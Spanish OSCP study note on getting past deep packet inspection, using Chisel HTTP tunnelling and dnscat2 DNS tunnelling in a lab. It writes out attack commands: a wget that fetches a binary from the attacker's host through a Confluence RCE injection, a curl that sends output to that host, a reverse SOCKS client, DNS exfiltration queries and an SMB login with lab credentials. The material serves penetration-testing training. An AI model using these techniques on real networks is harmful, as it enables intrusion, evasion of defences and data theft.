---
tipo: modulo
modulo: 20
estado: repasado
tags:
  - oscp
  - pivoting
  - linux
fecha: 2026-10-06
---

# 20 - Tunneling Through Deep Packet Inspection

> [!abstract] Resumen
> Cómo tunelizar cuando un **Deep Packet Inspection (DPI)** filtra por **protocolo** (no solo por puerto) en el perímetro. Los túneles SSH clásicos del módulo anterior fallan porque el DPI termina todo lo que no "parezca" el protocolo permitido. Dos técnicas para disfrazar el tráfico:
> - **20.1 HTTP tunneling con Chisel**: encapsula el stream dentro de **HTTP** (WebSocket) y lo cifra con SSH interno. Montamos un **reverse SOCKS proxy** para llegar por SSH a una máquina interna, con todo el tráfico con forma de HTTP saliente.
> - **20.2 DNS tunneling con dnscat2**: exfiltra datos en **subdominios** de consultas DNS e infiltra datos en respuestas **TXT/CNAME/MX**. Sirve cuando el host interno no tiene salida directa pero su resolver DNS sí alcanza nuestro name server autoritativo.
> Idea clave del examen: cuando SSH/revshell no pasan el perímetro pero HTTP o DNS sí → Chisel (HTTP) o dnscat2 (DNS). Ambos son **ruidosos**; DNS tunneling es lentísimo y genera avalanchas de queries.

## Conceptos clave
- **Deep Packet Inspection (DPI)**: inspecciona el **contenido** del paquete, no solo IP/puerto. Puede terminar cualquier conexión que no respete el formato del protocolo permitido (p.ej. "solo HTTP saliente") → mata reverse shells y remote port forwards SSH.
- **Filtrado por protocolo ≠ por puerto**: un firewall normal bloquea puertos; un DPI puede dejar pasar TCP/8090 pero cortar el SSH que intentes meter por ahí si no tiene pinta de HTTP.
- **Chisel**: túnel HTTP cliente/servidor. Encapsula el tráfico en **HTTP (WebSocket)** y lo cifra con **SSH** dentro del túnel. Multiplataforma (Linux/Win/macOS), mismo binario para `server` y `client`.
- **Reverse port forwarding (Chisel)**: equivalente al *remote* port forward de SSH. El cliente (en el host comprometido) conecta **saliente** al servidor (Kali); el SOCKS proxy se abre en el **servidor**. Ideal cuando solo se permite tráfico saliente del host.
- **SOCKS proxy**: puerto genérico (1080 por defecto) por el que empujamos tráfico de cualquier herramienta. SSH no tiene opción SOCKS nativa → se usa `ProxyCommand` + `ncat`.
- **DNS**: resolución jerárquica (root → TLD → authoritative). Las queries recursivas viajan por **UDP/53**. Un host sin salida directa igual puede alcanzar un servidor externo **a través de su resolver**, que reenvía a nuestro name server autoritativo.
- **Exfiltración DNS**: datos en el **subdominio** de la query (`<hex-chunk>.feline.corp`). El authoritative server loguea y reconstruye. Pequeñas cantidades por request → fichero binario = muchos requests secuenciales (hex/base64).
- **Infiltración DNS**: datos en la **respuesta**, típicamente registros **TXT** ("arbitrary string information"), también CNAME/MX. 
- **dnscat2**: framework de túnel DNS. Server en el authoritative name server del dominio, client en el host comprometido. Cifra la sesión y da port forwarding (`listen`, como `ssh -L`).

> [!tip] Idea para el examen
> El lab **no tiene DPI real** — es un escenario hipotético para forzar técnicas robustas. Lo que importa: si el perímetro filtra por protocolo y solo pasa **HTTP → Chisel**; solo resuelve **DNS → dnscat2**. Con Chisel, usa `server --port <p> --reverse` en Kali y `client <kali>:<p> R:socks` en el target (SOCKS en 1080 de Kali). Para SSH por SOCKS: `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p'`. **Verifica la compatibilidad del binario** (ver glibc abajo).

---

## 20.1 HTTP tunneling con Chisel

Ver nota → [[HTTP Tunneling con Chisel]].

**Escenario**: comprometido CONFLUENCE01 (RCE vía HTTP, CVE-2022-26134). El DPI solo deja pasar **HTTP saliente** y en CONFLUENCE01 solo está abierto **TCP/8090** inbound. No sirven reverse shell ni remote port forward SSH. Objetivo: SSH a PGDATABASE01 (red interna) a través de CONFLUENCE01, con tráfico con forma de HTTP saliente.

![[mod20-chisel-reverse-tunnel.png]]

### Plan
Server Chisel en Kali (abre SOCKS 1080) ← HTTP/WebSocket ← client Chisel en CONFLUENCE01. Lo que mandemos al SOCKS 1080 sale cifrado por el túnel HTTP y CONFLUENCE01 lo reenvía a la red interna.

### Subir el binario al target (vía Apache + inyección)
```bash
sudo cp $(which chisel) /var/www/html/     # servir el binario por HTTP
sudo systemctl start apache2
```
Payload wget a ejecutar dentro de la inyección Confluence (descarga y hace ejecutable):
```bash
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

### Levantar server y client
```bash
# Kali (servidor)
chisel server --port 8080 --reverse        # --reverse: el SOCKS se bindea cuando el client conecta
sudo tcpdump -nvvvXi tun0 tcp port 8080     # (opcional) ver si llega la conexión
```
```bash
# CONFLUENCE01 (cliente, lanzado por la inyección). R:socks = reverse SOCKS (1080 por defecto)
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

> [!warning] Incompatibilidad de glibc (binario demasiado nuevo)
> El Chisel de los repos Kali (1.8.1, compilado con **Go ≥1.20**) peta en targets viejos: `version 'GLIBC_2.32' not found`. Go 1.20+ introdujo esa dependencia. **Solución**: usar el binario oficial de GitHub (misma 1.8.1 pero compilado con **Go 1.19**).
> Truco para **leer el error** cuando el proceso corre en background sin stdout accesible: redirige todo a un fichero y envíalo por HTTP a Kali:
> ```bash
> /tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
> ```
> (se captura con el `tcpdump` del puerto 8080).

```bash
# Descargar binario compatible (Go 1.19) y servirlo
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
sudo cp ./chisel /var/www/html          # sobrescribe el anterior; re-ejecutar el wget en el target
```

### Verificar el túnel y usarlo
Con el client conectado, el server loguea `proxy#R:127.0.0.1:1080=>socks: Listening`:
```bash
ss -ntplu                               # confirma 127.0.0.1:1080 LISTEN (chisel)
```
SSH no tiene flag SOCKS nativo → `ProxyCommand` + **ncat** (el netcat de Kali no proxyea):
```bash
sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
# %h y %p los rellena SSH con host y puerto destino
```

> [!important] Resultado: SSH a PGDATABASE01 a través de un **reverse SOCKS proxy de Chisel**, viajando dentro de un túnel HTTP/WebSocket cifrado. Solo tráfico con forma de HTTP cruzó el perímetro.

---

## 20.2 DNS tunneling con dnscat2

Ver nota → [[DNS Tunneling con dnscat2]].

**Escenario**: PGDATABASE01 (interno) **no tiene salida directa**, pero su resolver es MULTISERVER03, que sí reenvía al authoritative name server externo **FELINEAUTHORITY** (zona `feline.corp`, en la WAN con Kali). Toda query a `*.feline.corp` acaba en FELINEAUTHORITY aunque el host interno no pueda conectar a él.

![[mod20-dns-resolucion.png]]

### Fundamentos: exfiltración e infiltración
**Exfiltración** — el dato viaja en el **subdominio**. Montamos Dnsmasq como authoritative de `feline.corp` y vemos llegar la query:
```bash
# FELINEAUTHORITY — config mínima dnsmasq.conf: no-resolv / no-hosts / auth-zone=feline.corp / auth-server=feline.corp
sudo dnsmasq -C dnsmasq.conf -d          # -d = foreground (no daemon)
sudo tcpdump -i ens192 udp port 53       # ver las queries entrantes
```
```bash
# PGDATABASE01 — una query cuyo subdominio ES el dato a exfiltrar
nslookup exfiltrated-data.feline.corp    # NXDOMAIN, pero la query LLEGA a FELINEAUTHORITY
resolvectl status                        # confirma el DNS server (systemd-resolved -> 127.0.0.53)
```

![[mod20-dns-exfiltracion.png]]

**Infiltración** — el dato viaja en la **respuesta TXT**. Añadimos `txt-record=` en Dnsmasq:
```bash
# dnsmasq_txt.conf añade: txt-record=www.feline.corp,here's something useful!
sudo dnsmasq -C dnsmasq_txt.conf -d
```
```bash
# PGDATABASE01 — pedir el TXT
nslookup -type=txt www.feline.corp       # devuelve las strings arbitrarias (datos infiltrados)
```
Binario → serializar a **hex/base64** troceado (exfil) o servir como serie de TXT (infil).

### dnscat2 (túnel completo)
Server en el authoritative, client en el host comprometido:
```bash
# FELINEAUTHORITY (matar dnsmasq antes; usa UDP/53)
dnscat2-server feline.corp               # imprime el --secret y crea la sesión al conectar el client
```
```bash
# PGDATABASE01
./dnscat feline.corp                     # tipos usados: TXT, CNAME, MX. Imprime auth string (verificar que coincide)
```
Sin `--secret` precompartido, imprime una **auth string** (p.ej. `Annoy Mona Spiced...`) que debe **coincidir** en ambos extremos → sin tampering. Cambia en cada conexión.

### Interactuar y port forwarding
```text
dnscat2> windows                         # lista sesiones; la del cliente aparece como "command (pgdatabase01)"
dnscat2> window -i 1                      # entrar a la sesión de comandos
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445   # como ssh -L: local 4455 -> 445 en HRSHARES
```
```bash
# Otra shell en FELINEAUTHORITY — usar el port forward a través del túnel DNS
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

> [!warning] DNS tunneling **no es sigiloso**: genera avalancha de queries CNAME/TXT/MX (visibles en cualquier tcpdump/IDS) y es **lento** (SMB encapsulado en DNS/UDP). El payload va cifrado, así que loguear el contenido aporta poco. "Chicken-or-egg": exfiltración es solo transporte de datos; **necesitas un vector de ejecución previo** para dejar el client dnscat2 en el host (p.ej. SCP por la conexión SSH).

---

## Comandos
```bash
# --- Chisel (HTTP tunnel) ---
chisel server --port 8080 --reverse                                   # Kali: server, SOCKS al conectar el client
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &      # target: reverse SOCKS (1080)
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.4.50.215

# --- dnscat2 (DNS tunnel) ---
dnscat2-server feline.corp                                            # authoritative NS (Kali/FELINEAUTHORITY)
./dnscat feline.corp                                                  # client en el host comprometido
# en la command session: listen 127.0.0.1:4455 172.16.2.11:445       # port forward tipo ssh -L
```
| Flag / parte | Qué hace |
|---|---|
| `server --reverse` | Permite reverse port forwarding; el SOCKS se abre en el server |
| `R:socks` | Reverse tunnel con SOCKS proxy (puerto 1080 por defecto) |
| `ProxyCommand` + `ncat --proxy-type socks5` | Hace pasar SSH por el SOCKS (SSH no tiene flag SOCKS nativo) |
| `dnsmasq -C <conf> -d` | Dnsmasq con config custom, en foreground |
| `nslookup -type=txt` | Pide registros TXT (infiltración de datos) |
| `listen <lhost>:<lport> <rhost>:<rport>` | Port forward en dnscat2 (como `ssh -L`) |

> [!warning] Errores comunes / cosas que fallan
> - Binario de Chisel **incompatible** con el target (glibc) → usar el oficial de GitHub (Go 1.19) y leer el error redirigiéndolo por HTTP.
> - El **netcat** de Kali no proxyea → instalar **ncat** (Nmap).
> - Olvidar `&` / `> /dev/null 2>&1` en la inyección → el web shell se cuelga esperando al proceso.
> - dnscat2 usa UDP/53: matar primero cualquier dnsmasq que ocupe el puerto.

## Ejemplo práctico
> [!example] Cadena del módulo
> 1. **Chisel**: RCE en CONFLUENCE01 (HTTP) → `chisel server --port 8080 --reverse` en Kali → inyección lanza `chisel client ... R:socks` → SOCKS 1080 en Kali → `ssh -o ProxyCommand='ncat ... socks5 ...' database_admin@10.4.50.215` → shell en PGDATABASE01, todo como HTTP saliente.
> 2. **dnscat2**: SSH a PGDATABASE01 (pivot por CONFLUENCE01) + SSH directo a FELINEAUTHORITY → `dnscat2-server feline.corp` en el authoritative, `./dnscat feline.corp` en PGDATABASE01 → `listen 127.0.0.1:4455 172.16.2.11:445` → `smbclient -p 4455 ...` lista shares de HRSHARES a través del túnel DNS.

## Relacionado
- Técnicas: [[HTTP Tunneling con Chisel]] · [[DNS Tunneling con dnscat2]]
- Cheatsheet: [[Pivoting y Tunneling]]
- Módulo previo: [[19 - Port Redirection and SSH Tunneling]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - ¿Cómo detectar en el examen que hay filtrado por **protocolo** (DPI) y no solo por puerto?
> - Chisel también soporta forward port forwarding y tunelizar sin SOCKS (`R:<lport>:<rhost>:<rport>`) — repasar variantes.
> - ¿Alternativas más sigilosas a dnscat2 para DNS tunneling (iodine, limitar tipos de registro)?
